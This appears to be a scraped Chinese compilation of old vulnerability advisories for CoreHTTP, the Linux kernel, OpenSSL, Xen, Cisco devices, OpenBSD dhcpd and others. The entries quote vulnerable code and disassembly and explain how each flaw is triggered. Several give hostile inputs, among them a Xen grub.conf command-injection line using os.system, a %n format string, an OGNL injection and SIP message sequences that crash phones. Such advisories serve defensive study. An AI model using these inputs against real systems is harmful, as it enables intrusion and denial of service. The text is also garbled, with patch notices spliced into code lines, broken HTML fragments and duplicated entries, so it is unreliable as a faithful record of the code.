CoreHTTP是一款小型的Web服务器?CoreHTTP在处理超长用户请求时存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制服务器?CoreHTTP的http.c文件中存在缓冲区溢出漏洞? -----------------------------------------------------------------------  struct sprock_t *HttpSprockMake(struct sprock_t *parentsprock) {              struct sprock_t *sprocket;                                                char req[PATHSIZE], url[PATHSIZE], status[PATHSIZE], temp[BUFSIZE],  ...                                                                          if ((sprocket = (struct sprock_t *)                                           malloc(sizeof(struct sprock_t))) == NULL) return NULL;          ...                                                                          sscanf(parentsprock->buffer, \"%[A-Za-z] 目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://corehttp.sourceforge.net/\" target=\"_blank\" rel=\"nofollow\">http://corehttp.sourceforge.net/</a>%*[ \t\n]\", req, url);      !(the bug/overwrite) --------------------------------------^----^            strncpy(sprocket->parent->url, url, PATHSIZE);                        !(the problem) -^                                                        ...                                                                          for (i = 0; req[i] != &#039;\0&#039;; i++)                                              req[i] = toupper(req[i]);                                        !(another problem) -^                                                    ...                                                                      }                                                                      上面代码中的sscanf()调用没有对写入req[]或url[]执行边界检查，导致可能覆盖*sprocket结构指针。如果用户提交了超长请求的话，就可以触发这个溢出，导致执行任意指令?      sBlog 0.7.3 Beta的search.php中存在跨站脚本攻击漏洞。远程攻击者可以借助搜索字符串中的一个主要的 &#039;\"/></> 序列，注入任意HTML和web脚步?      PHP-Nuke的搜索模块中存在多个跨站脚本攻击漏洞。远程攻击者可借助IMG元件的nerror属性，IFRAME元件的onload属性中?ldquo;<&rdquo;替代&ldquo;>&rdquo;，注入任意web脚本或HTML，或借助META标签，重定向用户至其它站点?   <a href="z2</a></li></ul><ul><li><a href="z2</a></li></ul><ul><li><a href="z2</a></li></ul><ul><li><a href="z2</a></li></ul><ul><li><a href="z2</a></li></ul><ul><li><a href="   StreamRipper能够将网上的MP3流媒体保存到硬盘中，特别适合录制网络MP3广播?StreamRipper中用于解析HTTP头的代码中存在多个缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制用户系统?具体位于lib/http.c文件httplib_parse_sc_header()函数?24行：extract_header_value()函数是通过Location:字符串调用的?lib/http.c...extract_header_value(header, info->http_location, \"Location:\");...        int extract_header_value (char *header, char *dest, char *match)        {            char* start = (char *)strstr(header, match);            if (start) {                subnstr_until(start+strlen(match), \"\n\", dest, MAX_ICY_STRING);                return 1;            } else {                return 0;            }        }...lib/mchar.c...        char *subnstr_until(const char *str, char *until, char *newstr, int maxlen)        {            const char *p = str;            int len = 0;            for(len = 0; strncmp(p, until, strlen(until)) != 0 && len < maxlen; p++)            {                newstr[len] = *p;                len++;            }            newstr[len] = &#039;\0&#039;;            return newstr;        }...extract_header_value()假设info->http_location大小为MAX_ICY_STRING(4024)字节，但实际仅为MAX_HOST_LEN(512)字节；对仅有MAX_SERVER_LEN(1024)字节的HTTP头字符串Server:也做了同样的假设。如果用户受骗连接到了恶意的服务器的话，就可能触发缓冲区溢出，导致执行任意指令?      \"Cisco IOS是思科网络设备中所使用的操作系统?Cisco IOS处理特定的show ip bgp regexp命令参数时存在漏洞，本地攻击者可能利用此漏洞导致设备不可用?如果用户向运行Cisco IOS的网络设备所发布的show ip bgp regexp命令中将某些正则表达式用作参数的话，就可能触发栈溢出，导致路由器重启，必须重构BGP路由表。如果连续几次出现这种情况的话，就可能导致运营商的网络不可用?<*链接：http://www.heise-security.co.uk/news/print/94526        http://www.cisco.com/warp/public/707/cisco-sr-20070912-regexp.shtml        http://secunia.com/advisories/26798/        https://puck.nether.net/pipermail/cisco-nsp/2007-August/043010.html        http://forum.cisco.com/eforum/servlet/NetProf?page=netprof&forum=Network%20Infrastructure&topic=WAN%*>\"       \"Cisco 7940型IP电话是一种多功能通讯设备，通过IP网络传递语音信号?Cisco 7940在处理特定的请求序列时存在漏洞，远程攻击者可能利用此漏洞导致设备不可用?如果向Cisco 7940 IP电话发送了以下3个消息序列的话：X ------------------------- INVITE -----------------------> CiscoX <--- 481 transaction does not exists -----  CiscoX ------------------------- OPTIONS--------------------> CiscoX <--------------------------- OK -------------------------  CiscoX <--- 481 transaction does not exists -----  CiscoX ------------------------- OPTIONS--------------------> Cisco或发送以?0个消息序列的话：X ------------------------- INVITE -----------------------> CiscoX <--------------- 400 Bad Request  ---------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX ------------------------- OPTIONS--------------------> CiscoX <--------------------- 200 OK -------------------------  CiscoX ------------------------- OPTIONS--------------------> CiscoX <--------------------- 200 OK -------------------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX ------------------------- INVITE -----------------------> CiscoX <--------------- 400 Bad Request  ---------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX ------------------------- OPTIONS--------------------> CiscoX <--------------- 404 Not Found ------------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX <--------------- 400 Bad Request  ---------------  CiscoX ------------------------- OPTIONS--------------------> CiscoX <--------------------- 200 OK -------------------------  CiscoX ------------------------- INVITE -----------------------> CiscoX <----------------100 Trying  -------------------------  CiscoX <--------------- 404 Not Found ------------------  CiscoX <--------------- 404 Not Found ------------------  CiscoX <--------------- 404 Not Found ------------------  CiscoX ------------------------- OPTIONS--------------------> CiscoX <--------------------- 200 OK -------------------------  CiscoX <--------------- 404 Not Found ------------------  CiscoX ------------------------- OPTIONS--------------------> CiscoX <--------------------- 200 OK -------------------------  CiscoX <--------------- 404 Not Found ------------------  Cisco就会导致设备重启?\"       \"GXV-3000是潮流科技(Grandstream)基于SIP和H.264标准的下一代高级IP视频电话?GXV-3000在处理特定的消息序列时存在漏洞，远程攻击者可能利用此漏洞导致设备不可用?如果向GXV-3000电话发送了以下两个消息序列的话，就会导致设备拒绝服务：                 X  ----------------------- INVITE -------------------> GXV-3000                X <------------------ 100 Trying  -----------------   GXV-3000                X <--------------- 180 Ringing ------------------- GXV-3000                X ------------- 183 Session Progress ------->  GXV-3000                X <-----------RTP - FLOW ------------------------  GXV-3000\"       Vavoom是Doom游戏的移植?Vavoom的sv_main.cpp文件中的SAY命令存在格式串漏洞，如果向游戏引擎发送了包含有\"%n%n%n%n目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://www.vavoom-engine.com\" target=\"_blank\" rel=\"nofollow\">http://www.vavoom-engine.com</a>\"格式串标识符的特制对话消息的话就可能导致服务器崩溃或执行任意指令?       \"XWork是一个命令模式框架，用于支持Struts 2及其他应用?如果启用了altSyntax功能的话，XWork就允许向文本字符串中注入OGNL表达式并递归的处理。远程攻击者可以通过HTML文本字段提交字符串，并在其中包含OGNL表达式，如果表单验证失败的话就会执行该表达式。例如，如果以下表单要求phoneNumber字段为非空的话：<s:form action=\"editUser\">  <s:textfield name=\"name\" />  <s:textfield name=\"phoneNumber\" /></s:form>用户可以将phoneNumber字段保持为空来触发验证错误，然后在name字段填充%{1+1}，当向用户重新显示表单时name字段的值就会为2?\"    strcmp(msg->return_path, "<>") == 0 ||   Linux Kernel是开放源码操作系统Linux所使用的内核?Linux系统的ALSA声卡驱动实现上存在漏洞，本地攻击者可能利用此漏洞获取内核内存中的敏感信息?Linux Kernel在处理多?proc/driver/snd-page-alloc文件的读操作时存在安全漏洞，sound/core/memalloc.c文件中如下定义了读操作的系统调用snd_mem_proc_read?  484 static int snd_mem_proc_read(char *page, char **start, off_t off,  485                              int count, int *eof, void *data)  486 {  487         int len = 0;  ...  494         len += snprintf(page + len, count - len,  495                         \"pages  : %li bytes (%li pages per %likB)\n\",  496                         pages * PAGE_SIZE, pages, PAGE_SIZE / 1024);  ...  508         return len;  509 }?94行调用了snprintf以生成proc文件系统项的输出，如果提供了计数?，snprintf就会仅向目标缓冲区写入单个字节，但如果有足够空间的话，函数就会返回应写入的字节数。没有设置过*eof值，也没有使用过*ppos值?fs/proc/generic.c文件中定义了从proc_file_read调用的这个函数：   51 static ssize_t   52 proc_file_read(struct file *file, char __user *buf, size_t nbytes,   53                loff_t *ppos)   54 {  ...  136                         n = dp->read_proc(page, &start, *ppos,  137                                           count, &eof, dp->data);  ...  155                         n -= *ppos;  156                         if (n <= 0)157                                 break;  158                         if (n > count)  159                                 n = count;  160                         start = page + *ppos;  ...  186                 n -= copy_to_user(buf, start < page ? page : start, n);...  193                 *ppos += start < page ? (unsigned long)start : n;?36行从对snd_proc_mem_read函数的调用返回了值n。由于返回?在单个设备的情况下大约为41)大于所请求的读大小(1)，在158行n值被设置为count，之?ppos递增，从start(计算为page + *ppos)将n字节拷贝到了用户域?在之后的用户域读操作中，如果*ppos大于0的话，proc_file_read函数就会拷贝过snd_mem_proc_read写入的页面，导致泄露内核内存?       Linux Kernel是开放源码操作系统Linux所使用的内核?Linux Kernel处理应用程序兼容的底层代码存在漏洞，本地攻击者可能利用此漏洞提升自己的权限?在x86_64平台上，Linux Kernel支持对IA32用户域应用程序的兼容模拟，arch/x86_64/ia32/ia32entry.S代码优化导致在底层汇编例程中使用了无效的opcode，以下代码部分没有充分地验证%RAX寄存器：---8<---sysenter_do_call:        cmpl    $(IA32_NR_syscalls-1),%eax        ja      ia32_badsys        IA32_ARG_FIXUP 1        call    *ia32_sys_call_table(,%rax,8)--8<---cstar_do_call:        cmpl $IA32_NR_syscalls-1,%eax        ja  ia32_badsys        IA32_ARG_FIXUP 1        call *ia32_sys_call_table(,%rax,8)---8<---ia32_do_syscall:        cmpl $(IA32_NR_syscalls-1),%eax        ja  ia32_badsys        IA32_ARG_FIXUP        call *ia32_sys_call_table(,%rax,8) # xxx: rip relative---8<---由于没有正确地验证存储在%RAX寄存器中?4位值，可能导致越界系统调用表访问，本地攻击者可以在Linux Kernel系统环境中执行任意指令?      Alien Arena 2007是基于Quake 2引擎的GPL代码所开发的开源第一人称扮演游戏?Alien Arena 2007在处理畸形的请求数据时存在漏洞，远程攻击者可能利用此漏洞导致拒绝服务或控制系统?Alien Arena 2007的safe_bprintf函数没有正确地使用cprintf，允许攻击者通过发送畸形的昵称导致执行任意指令。game/acesrc/acebot_cmds.c文件中的漏洞代码如下?void safe_bprintf (int printlevel, char *fmt, ...){    int i;    char    bigbuffer[0x10000];int     len;    va_list     argptr;    edict_t *cl_ent;    va_start (argptr,fmt);    len = vsprintf (bigbuffer,fmt,argptr);    va_end (argptr);    if (dedicated->value)        gi.cprintf(NULL, printlevel, bigbuffer);    for (i=0 ; i<maxclients->value ; i++)    {        cl_ent = g_edicts + 1 + i;        if (!cl_ent->inuse || cl_ent->is_bot)            continue; gi.cprintf(cl_ent, printlevel, bigbuffer);    }} 在进行查询的时候，游戏服务器会返回很多信息，包括当前的玩家列表及其IP地址等。在获得了这些信息后，攻击者可以向上述IP和端口发送client_connect命令导致断开所有的客户端?      Alien Arena 2007是基于Quake 2引擎的GPL代码所开发的开源第一人称扮演游戏?Alien Arena 2007在处理畸形的请求数据时存在漏洞，远程攻击者可能利用此漏洞导致拒绝服务或控制系统?Alien Arena 2007的safe_bprintf函数没有正确地使用cprintf，允许攻击者通过发送畸形的昵称导致执行任意指令。game/acesrc/acebot_cmds.c文件中的漏洞代码如下?void safe_bprintf (int printlevel, char *fmt, ...){    int i;    char    bigbuffer[0x10000];int     len;    va_list     argptr;    edict_t *cl_ent;    va_start (argptr,fmt);    len = vsprintf (bigbuffer,fmt,argptr);    va_end (argptr);    if (dedicated->value)        gi.cprintf(NULL, printlevel, bigbuffer);    for (i=0 ; i<maxclients->value ; i++)    {        cl_ent = g_edicts + 1 + i;        if (!cl_ent->inuse || cl_ent->is_bot)            continue; gi.cprintf(cl_ent, printlevel, bigbuffer);    }} 在进行查询的时候，游戏服务器会返回很多信息，包括当前的玩家列表及其IP地址等。在获得了这些信息后，攻击者可以向上述IP和端口发送client_connect命令导致断开所有的客户端?      联众世界游戏大厅是联众世界自主开发的一款集棋牌、休闲、对战于一体的游戏客户端?联众世界游戏大厅所安装的GLItemCom.DLL ActiveX控件过于信任用户输入，未检测用户提供的字符串长度，导致对象虚函数表指针被覆盖，从而获得系统控制权?IE首先创建obj_vuln对象，位置恰好在obj_now对象? 03803034   /$   56                                 PUSH ESI 03803035   |.   8BF1                             MOV ESI,ECX 03803037   |.   6A 58                            PUSH 58    ;   对象大小:58h,?8字节 03803039   |.   8366 10 00                    AND DWORD PTR DS:[ESI+10],0 0380303D   |.   8366 14 00                    AND DWORD PTR DS:[ESI+14],0 03803041   |.   8366 18 00                    AND DWORD PTR DS:[ESI+18],0 03803045   |.   C706 C4048103             MOV DWORD PTR DS:[ESI],038104C4 0380304B   |.   E8 2C370000                CALL 0380677C    ;   创建obj_vuln对象 03803050   |.   85C0                             TEST EAX,EAX 03803052   |.   59                                  POP ECX 03803053   |.   74 0A                            JE SHORT 0380305F03803055   |.   56                                  PUSH ESI03803056   |.   8BC8                             MOV ECX,EAX03803058   |.   E8 390D0000                  CALL 03803D96    ;   初始化obj_vuln对象0380305D   |.   EB 02                            JMP SHORT 038030610380305F   |>   33C0                             XOR EAX,EAX03803061   |>   6A 08                            PUSH 803803063   |.   8946 08                          MOV DWORD PTR DS:[ESI+8],EAX    ;   保存obj_vuln==>[ESI+8] 记住这个,后面要提?然后进入SetInfo()流程:03802F25   |> \56             PUSH ESI     ; /EvilString <=== 嘿嘿~03802F26   |.   8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]     ; |03802F29   |.   FF75 0C        PUSH DWORD PTR SS:[EBP+C]      ; |Arg703802F2C   |.   8D48 14        LEA ECX,DWORD PTR DS:[EAX+14]    ; |03802F2F   |.   FF75 20        PUSH DWORD PTR SS:[EBP+20]    ; |Arg603802F32   |.   FF75 1C        PUSH DWORD PTR SS:[EBP+1C]    ; |Arg503802F35   |.   FF75 18        PUSH DWORD PTR SS:[EBP+18]    ; |Arg403802F38   |.   FF75 10        PUSH DWORD PTR SS:[EBP+10]    ; |Arg303802F3B   |.   FF75 F8        PUSH DWORD PTR SS:[EBP-8]    ; |Arg203802F3E   |.   FF75 F4        PUSH DWORD PTR SS:[EBP-C]    ; |Arg103802F41   |.   E8 7E010000    CALL 038030C4    ; \调用SetInfo()F7跟进跟进SetInfo()，会将EvilString填充到obj_now里面?038030C4   /$   55                           PUSH EBP038030C5   |.   8BEC                       MOV EBP,ESP038030C7   |.   56                            PUSH ESI038030C8   |.   8BF1                       MOV ESI,ECX038030CA   |.   FF75 10                 PUSH DWORD PTR SS:[EBP+10]038030CD   |.   B9 90568103          MOV ECX,03815690038030D2   |.   FF75 0C                 PUSH DWORD PTR SS:[EBP+C]038030D5   |.   FF75 08                  PUSH DWORD PTR SS:[EBP+8]038030D8   |.   E8 DB040000         CALL 038035B8038030DD   |.   FF75 20                 PUSH DWORD PTR SS:[EBP+20]038030E0   |.   8D46 1C                 LEA EAX,DWORD PTR DS:[ESI+1C]038030E3   |.   50                            PUSH EAX038030E4   |.   E8 37350000           CALL 03806620038030E9   |.   FF75 24                  PUSH DWORD PTR SS:[EBP+24]    ;   EvilString038030EC   |.   8D46 3C                 LEA EAX,DWORD PTR DS:[ESI+3C]    ;   obj_now+0x3C obj_new偏移60字节?038030EF   |.   50                            PUSH EAX                                  :  038030F0   |.   E8 2B350000          CALL 03806620    ;   EvilString复制到obj_now+0x3C <== 问题出在这里,没有检测EvilString的长?执行完SetInfo()后，看堆里的情况?$ ==>     03823D80       038104C4   ??     <=== obj_now的开?$+4       03823D84       03823D68   h=?$+8       03823D88       03823DE0   ??    $+C       03823D8C       03823E48   H>?$+10      03823D90       00000001    ... $+14      03823D94       00000001    ... $+18      03823D98       00000001    ... $+1C      03823D9C       00000000    ... .$+20      03823DA0       00000000    ... .$+24      03823DA4       00000000    ... .$+28      03823DA8       00000000    ... .$+2C      03823DAC       00000000    ... .$+30      03823DB0       00000000    ... .$   Invision Power Board是一个非常流行的PHP论坛程序?Invision Power Board的ips_kernel/class_ajax.php文件没有正确地验证用户配置文件中某些字段的输入，允许攻击者注入任意HTML和脚本代码，如果浏览了恶意用户的配置文件就会在管理用户浏览器环境中执行这些代码。成功攻击要求将Invision Power Board配置为使用非iso-8859-1和utf-8字符集?Invision Power Board的订单管理器在处理支付时存在漏洞，攻击者可以通过提交特制的支付表单修改成员ID。成功利用这个漏洞可以将管理员和版主降级到订单用户组，但要求启用了订单软件包? <*链接：http://secunia.com/advisories/19830/print/ http://forums.invisionpower.com/index.php?showtopic=237075        Invision Power Board是一个非常流行的PHP论坛程序?Invision Power Board的ips_kernel/class_ajax.php文件没有正确地验证用户配置文件中某些字段的输入，允许攻击者注入任意HTML和脚本代码，如果浏览了恶意用户的配置文件就会在管理用户浏览器环境中执行这些代码。成功攻击要求将Invision Power Board配置为使用非iso-8859-1和utf-8字符集?Invision Power Board的订单管理器在处理支付时存在漏洞，攻击者可以通过提交特制的支付表单修改成员ID。成功利用这个漏洞可以将管理员和版主降级到订单用户组，但要求启用了订单软件包?<*链接：http://secunia.com/advisories/19830/print/http://forums.invisionpower.com/index.php?showtopic=237075        Microsoft Windows是微软发布的非常流行的操作系统?Windows系统中所提供的MFC42和MFC71库的CFileFind类在处理FindFile()函数参数时存在堆溢出漏洞，本地攻击者可能利用此漏洞提升自己的权限?MFC[42|71].dll@CFileFind::FindFile(char const *,unsigned long).text:73D6CD3F  mov     edi, edi.text:73D6CD41  push    ebp.text:73D6CD42  push    esi             ; unsigned int.text:73D6CD43  push    edi             ; unsigned __int8 *.text:73D6CD44  mov     esi, ecx.text:73D6CD46  call    CFileFind::Close(void).text:73D6CD4B  push    140h                    ; int   << 320 bytes.text:73D6CD50  call    @operator new(uint)             << buffer Allocate [1].text:73D6CD55  mov     ebp, [esp+14h].text:73D6CD59  and     dword ptr [esi+10h], 0.text:73D6CD5D  test    ebp, ebp.text:73D6CD5F  pop     ecx.text:73D6CD60  mov     [esi+8], eax.text:73D6CD63  jnz     short loc_73D6CD6A.text:73D6CD65  mov     ebp, offset a__1        ; \"*.*\" << si arg_0 == NULL.text:73D6CD6A loc_73D6CD6A; CODE XREF: CFileFind::FindFile(char const*,ulong)+24j.text:73D6CD6A    push    ebp                           ; lpString2.text:73D6CD6B    add     eax, 2Ch.text:73D6CD6E    push    eax                           ; lpString1.text:73D6CD6F    call    ds:__imp__lstrcpyA@8          ; lstrcpyA(x,x) << [2].text:73D6CD75    push    dword ptr [esi+8]             ; lpFindFileData.text:73D6CD78    push    ebp                           ; lpFileName.text:73D6CD79    call    ds:__imp__FindFirstFileA@8    ; FindFirstFileA(x,x) [...]MFC[42|71]u.dll@CFileFind::FindFile(char const *,unsigned long).text:5F817BFC  push    ebx                     ; wchar_t.text:5F817BFD  push    esi                     ; wchar_t *.text:5F817BFE  push    edi.text:5F817BFF  mov     esi, ecx.text:5F817C01  call    CFileFind::Close(void).text:5F817C06  push    250h                    ; int   << 592 bytes.text:5F817C0B  call    @operator new(uint)             << buffer allocate [1].text:5F817C10  mov     ebx, [esp+14h].text:5F817C14  and     dword ptr [esi+10h], 0.text:5F817C18  test    ebx, ebx.text:5F817C1A  pop     ecx.text:5F817C1B  mov     [esi+8], eax.text:5F817C1E  jnz     short loc_5F817C25.text:5F817C20  mov     ebx, offset a_          ; \"*.*\" << si arg_0 == NULL.text:5F817C25 loc_5F817C25; CODE XREF: CFileFind::FindFile(ushort const*,ulong)+22j.text:5F817C25    push    ebx                           ; lpString2.text:5F817C26    add     eax, 2Ch.text:5F817C29    push    eax                           ; lpString1.text:5F817C2A    call    ds:__imp__lstrcpyW@8          ; lstrcpyW(x,x) << [2].text:5F817C30    push    dword ptr [esi+8]             ; lpFindFileData.text:5F817C33    push    ebx                           ; lpFileName.text:5F817C34    call    ds:__imp__FindFirstFileW@8    ;FindFirstFileW(x,x) [...]FindFile方式为[1]处的缓冲区分配内存，然后未经检查便储存了[2]处函数的第一个参数的内容。如果用户提交了超长参数的话就可以触发堆溢出，导致执行任意指令?      ython是一种开放源代码的脚本编程语言?Python的imageop模块实现上存在堆溢出漏洞，本地攻击者可能利用此漏洞提升自己的权限?Python的imageop模块的imageop.c和rbgimgmodule.c文件中存在整数溢出漏洞，最终会导致堆溢出。如果用户受骗打开了恶意的图形文件的话，就可能触发这些溢出，导致执行任意指令。有漏洞的代码段如下?static PyObject *imageop_tovideo(PyObject *self, PyObject *args){  int maxx, maxy, x, y, len;   ........................    /* *************** int overflow here permit to bypass len check******************* */if ( maxx*maxy*width != len ) {        PyErr_SetString(ImageopError, \"String has incorrect length\");        return 0;    }   rv = PyString_FromStringAndSize(NULL, len);    if ( rv == 0 )       return 0;    ncp = (unsigned char *)PyString_AsString(rv);    if ( width == 1 ) {    memcpy(ncp, cp, maxx);        /* Copy first line */      ncp += maxx;/* ********** with a negativ value it&#039;s possible to bypass the code ********** */ for (y=1; y<maxy; y++) {    /* Interpolate other lines */       ImageMagick是一款Unix/Linux平台下开源的图像查看和编辑工具?ImageMagick在处理畸形格式的文件时存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞通过诱使用户打开处理恶意文件控制系统?magick/blob.c文件中的ReadBlobString()函数存在缓冲区溢出漏洞：  3110    for (i=0; i < (long) MaxTextExtent; i++)  3111    {  3112      p=ReadBlobStream(image,1,buffer,&count);  ...  3119      string[i]=(char) (*p);  3120      if ((string[i] == &#039;\n&#039;) || (string[i] == &#039;\r&#039;))  3121        break;  3122    }  3123    string[i]=&#039;\0&#039;;string变量是MaxTextExtent长度的字符数组，如果\"i\"恰好为MaxTextExtent的话就会?123行触发单字节溢出。有多个图形文件处理例程可以触发这个函数，大多数情况下触发的都是栈溢出，但也可能为堆溢出?       Xen是可用于Linux内核的一种虚拟化技术，允许同时运行多个操作系统?Xen的实现上存在漏洞，本地攻击者可能利用此漏洞提升自己的权限?在启动guest域时，pygrub使用Python exec()语句处理grub.conf的不可信任数据，如果创建了特制的grub.conf文件的话，guest域中的root用户就可以在Domain-0中执行任意Python代码?有漏洞的代码位于tools/pygrub/src/GrubConf.py脚本的以下行?  exec(\"目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://xen.xensource.com/\" target=\"_blank\" rel=\"nofollow\">http://xen.xensource.com/</a>  = r\\"\\"\" %(self.commands[com], arg.strip()))可从guest域中修改/boot/grub/grub.conf文件，将default语句修改为：  default \"+str(0*os.system(\" insert evil command here \"))+\"在下一次启动guest域时就会在domain 0中执行恶意命令?       FrontAccounting是适用于中小企业的财务软件?FrontAccounting在处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞在服务器上执行任意命令?rontAccounting的access/login.php和includes/lang/language.php文件中没有正确地验证对path_to_root参数的输入，允许远程攻击者通过包含本地或外部资源的任意文件导致执行任意代码。有漏洞的代码段如下?RROR1:accsess/login.phpinclude_once($path_to_root . \"/includes/ui/ui_view.inc\"); <<< RFIERROR2:includes/lang/language.phpinclude_once($path_to_root . \"/lang/installed_languages.inc\");include_once($path_to_root . \"/includes/lang/gettext.php\"); <<< RFI       OpenSSL是一种开放源码的SSL实现，用来实现网络通信的高强度加密，现在被广泛地用于各种网络应用程序中?OpenSSL的SSL_get_shared_ciphers()函数中存在单字节溢出漏洞，远程攻击者可能利用此漏洞控制服务器?ssl/ssl_lib.c文件中漏洞代码如下：   p=buf;    sk=s->session->ciphers;    for (i=0; i<sk_SSL_CIPHER_num(sk); i++)           {            /* Decrement for either the &#039;:&#039; or a &#039;\0&#039; */            len--;                        [4]           c=sk_SSL_CIPHER_value(sk,i);           for (cp=c->name; *cp; )                   {                   if (len-- <= 0)                [1]                            {                           *p=&#039;\0&#039;;            [5]                            return(buf);                            }                    else                            *(p++)= *(cp++);        [2]                    }            *(p++)=&#039;:&#039;;                    [3]            }    p[-1]=&#039;\0&#039;;    return(buf);如果要触发单字节溢出，只需要用密码字符串填充缓冲区，使得len == 1且cp指向当前密码字符串的最后一个字符，然后内部for()循环的最后一轮会在[1]将len递减?，将当前密码字符串的最后一个字节写入到缓冲?[2])，增加p指向到缓冲区的最后空闲字节。之后用\":\"分隔符填充最后的空闲字节，增加p指向缓冲区后一个字节。现在如果仍有密码的话，就会再次陷入外部循环，在[4]将len减少?1然后在[1]再次执行检查。这一次检查为真，终止的\0字节在返回前写入到缓冲区后一个字?[5])?       libpng是多种应用程序使用的解析PNG图象格式的库?libpng在处理畸形格式的PNG图像文件时存在漏洞，远程攻击者可能利用此漏洞导致使用了此程序库的应用崩溃?libpng的pngtrtran.c文件中使用了逻辑NOT而不是位逻辑运算NOT，在使用sizeof(unknown_chunk.name)时存在错误，在pngset.c文件中与无符变量所做的<=比较应为==；在png_handle_pCAL()、png_handle_sCAL()、png_push_read_tEXt()、png_handle_iTXt()和png_handle_ztXt()函数中还存在多个越界读取错误。如果用户受骗打开了畸形的PNG图形的话，就可能导致使用该库的应用程序崩溃?      BrightStor ARCserve Backup可为各种平台的服务器提供备份和恢复保护功能?BrightStor ARCserve Backup的队列服务实现上存在漏洞，远程攻击者可能利用此漏洞控制服务器?如果向BrightStor的ARCserve Backup消息队列服务LQserver.exe发送了畸形的ONRPC协议请求的话，就会在Queue.dll中触发内存破坏。仅可以通过调用0x0006097d进程ID(LQserver.exe的特定Proc ID)下的0x76(数据队列请求)操作才可以触发这个漏洞。在初始化这个过程后，LQServer.exe就会调用有漏洞的DLL文件Queue.dll，这个过程未经任何验证便处理了用户数据并引用为变量，如下所示：<lqserver.exe>100161B0     MOV EDX,DWORD PTR DS:[ECX+4]    ; Move Arbitrary Pointer #2 into EDX100161B3     PUSH EDX            ; Push Arbitrary Pointer #2 onto the Stack100161B4     MOV EAX,DWORD PTR SS:[EBP+8]    ; Move (0x0113F8A8 the address to Arbitrary                        ; Pointer #1) into EAX100161B7     MOV ECX,DWORD PTR DS:[EAX]    ; Move Arbitrary Pointer #1 into ECX100161B9     PUSH ECX            ; Push Arbitrary Pointer #1 onto the Stack100161BA     CALL QUEUE.10012816        ; CALL Vulnerable DLL...<queue.dll>1001281C     CMP DWORD PTR SS:[EBP+8],0    ; EBP + 8 points to Arbitrary Pointer #1  - This makes                         ; sure our pointer isn&#039;t NULL.10012820     JNZ SHORT QUEUE.10012829    ; Since our pointer isn&#039;t NULL we jump10012829     MOV EAX,DWORD PTR SS:[EBP+8]    ; Load Arbitrary Pointer #1 into EAX1001282C       MOV DWORD PTR SS:[EBP-4],EAX    ; Write Arbitrary Pointer into EBP-4 (0x00D39618)1001282F       CMP DWORD PTR DS:[10037884],0    ; This checks for an error message field - NULL                         ; signifies &#039;The operation completed successfully&#039;10012836       JE SHORT QUEUE.10012870        ; Jump is taken10012870      MOV EAX,DWORD PTR SS:[EBP+C]    ; Move Arbitrary Pointer #2 into EAX10012873    PUSH EAX            ; Push Arbitrary Pointer #2 onto the stack10012874       PUSH QUEUE.10037884        ; Push NULL10012879       MOV ECX,DWORD PTR SS:[EBP-4]    ; Move Arbitrary Pointer #1 into ECX1001287C       MOV EDX,DWORD PTR DS:[ECX]    ; Move Arbitrary Pointer #1 into EDX1001287E      MOV ECX,DWORD PTR SS:[EBP-4]    ; Move Arbitrary Pointer #1 into ECX10012881      CALL DWORD PTR DS:[EDX]        ; Call Arbitrary Pointer #1这时Queue.dll引用并调用了Arbitrary Pointer #1，然后会调用Arbitrary Pointer #2。在调用Arbitrary Pointer #2后，攻击者就可以完全控制代码的执行并重新定向Queue.dll执行任意代码。攻击完成后，LQserver.exe会崩溃，必须通过CA Domain Server服务手工重启?      OpenBSD是一款开放源代码Unix类操作系统?OpenBSD系统的DHCP协议实现上存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制服务器?OpenBSD的options.c文件中的cons_options()函数没有正确地处理DHCP请求。如果远程攻击者所发送的DHCP请求中指定最大消息大小小于最小IP MTU(278)的话，就会在OpenBSD中导致dhcpd(8)覆盖栈缓冲区，执行任意指令?漏洞存在于负责处理从客户端所接收到的DHCP选项的函数中。在src/usr.sbin/dhcpd/options.c文件中： int cons_options(struct packet *inpacket, struct dhcp_packet *outpacket,     int mms, struct tree_cache **options,     int overload, /* Overload flags that may be set. */     int terminate, int bootpp, u_int8_t *prl, int prl_len) {         unsigned char priority_list[300];         int priority_len;         unsigned char buffer[4096];        /* Really big buffer... */         int main_buffer_size;         int mainbufix, bufix;         int option_size;         int length;    dhcp.h中定义了DHCP_FIXED_LEN?         if (!mms &&             inpacket &&             inpacket->options[DHO_DHCP_MAX_MESSAGE_SIZE].data &&             (inpacket->options[DHO_DHCP_MAX_MESSAGE_SIZE].len >=             sizeof(u_int16_t)))                 mms = getUShort(                     inpacket->options[DHO_DHCP_MAX_MESSAGE_SIZE].data);         if (mms)                 main_buffer_size = mms - DHCP_FIXED_LEN;         else if (bootpp)                 main_buffer_size = 64;         else                 main_buffer_size = 576 - DHCP_FIXED_LEN;         if (main_buffer_size > sizeof(buffer))                 main_buffer_size = sizeof(buffer);main_buffer_size是有符型，可被攻击者控制。只要main_buffer_size是比较小的正整数(<= 4096)，执行流就会正常进行?        /* Copy the options into the big buffer... */         option_size = store_options(             buffer,             (main_buffer_size - 7 + ((overload & 1) ? DHCP_FILE_LEN : 0)+                 ((overload & 2) ? DHCP_SNAME_LEN : 0)),             options, priority_list, priority_len, main_buffer_size,             (main_buffer_size + ((overload & 1) ? DHCP_FILE_LEN : 0)),             terminate);         /* Put the cookie up front... */         memcpy(outpacket->options, DHCP_OPTIONS_COOKIE, 4);         mainbufix = 4;这里如果main_buffer_size为比较小的正值的?<= 7)，就会导致store_options迅速退出，执行流会继续。具体来讲，只要客户端报文中的Maximum Segment Size?mms)满足(DHCP_FIXED_LEN < mms < 